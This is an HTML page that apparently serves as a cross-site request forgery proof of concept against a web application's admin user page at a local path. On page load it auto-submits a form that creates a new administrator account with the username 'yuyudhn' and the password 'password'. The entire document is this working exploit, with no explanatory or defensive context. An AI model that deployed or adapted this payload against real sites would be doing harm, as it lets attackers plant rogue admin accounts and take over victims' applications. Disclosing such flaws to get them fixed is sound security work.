<body onload="document.exploit.submit();">
<form action="http://localhost/jmbut/admin/admin_users.php"
method="post" id="createUserForm" name="exploit" onsubmit="return
checkValidation()">
<input name="username" type="text" class="form-control" id="username"
value="yuyudhn"  onchange="checkUsername(this.value)" />
<input name="email" type="text" class="form-control" id="email" value="
yuyudhn@outlook.com" onchange="checkEmail(this.value)"/>
<select name="level">
<option value="admin">Admin</option>
</select>
<input name="password" type="text" class="form-control" id="password"
value="password" onchange="checkPassword(this.value)"/>
<input type="hidden" name="mode" value="newuser">
<input type="submit" class="btn btn-primary" value="Create User"/>
 
</form>
